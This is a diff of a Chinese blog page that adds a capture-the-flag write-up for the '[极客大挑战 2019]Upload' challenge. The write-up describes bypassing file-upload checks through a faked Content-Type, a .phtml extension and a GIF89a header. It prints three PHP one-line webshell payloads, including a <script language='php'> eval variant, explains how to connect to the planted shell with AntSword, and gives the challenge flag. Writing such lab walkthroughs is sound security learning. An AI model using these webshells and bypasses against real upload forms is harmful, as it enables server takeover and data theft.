@@ -587,14 +587,14 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2022-01-19
+                    2022-01-20
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    228
+                    488
                 </div>
                 
 
@@ -646,6 +646,25 @@
 <li><code>User-Agent</code>: 浏览器表明自己的身份（是哪种浏览器）。 </li>
 <li><code>X-Forwarded-For</code>: 表示 HTTP 请求端真实 IP。</li>
 </ul>
+<h2 id="13-极客大挑战-2019-Upload"><a href="#13-极客大挑战-2019-Upload" class="headerlink" title="13.[极客大挑战 2019]Upload"></a>13.[极客大挑战 2019]Upload</h2><p>好久没做文件上传的题了，有点难到我了。</p>
+<p>首先上传一个一句话木马试试：</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'shell'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>显示：NOT IMAGE，那就抓包先改COntent-Type:<code>image/jpeg</code>:</p>
+<p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buu2/202201201146199.png"></p>
+<p>接着说不能是php，绕过后缀的有文件格式有php,php3,php4,php5,phtml，phtm，前几个试试都不行，那就试试phtml：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buu2/202201201146202.png"></p>
+<p>接着是不能含有’&lt;?’ ，那就再改，查到了一个payload:</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">&lt;</span>script language<span class="token operator">=</span><span class="token double-quoted-string string">"php"</span><span class="token operator">&gt;</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span>shell<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buu2/202201201146204.png"></p>
+<p>接着说不是图片，那就是检查了头部信息，加特征信息，成功上传：</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">GIF89a<span class="token operator">?</span> <span class="token operator">&lt;</span>script language<span class="token operator">=</span><span class="token double-quoted-string string">"php"</span><span class="token operator">&gt;</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buu2/202201201146205.png"></p>
+<p>最后在连的时候要猜一下文件上传到哪里了！<strong>常规的目录/upload下面</strong>，然后直接连  /upload/2.phtml  就可以了</p>
+<p>蚁剑连一下flag就在根目录，拿到flag:flag{07b9cce3-4089-4384-a26a-4572c9c90566}。</p>
+<p>总体思路大概就是先上传个马，看返回信息，然后对应改就可以了，还有很多过滤，以后慢慢遇见~</p>
 <hr>
 <img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buu2/202201191659121.jpg" style="zoom:150%;">
 
@@ -1505,7 +1524,7 @@ new Valine({
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">8.4k</span>&nbsp;字
+                class="white-color">8.7k</span>&nbsp;字
             
             
             
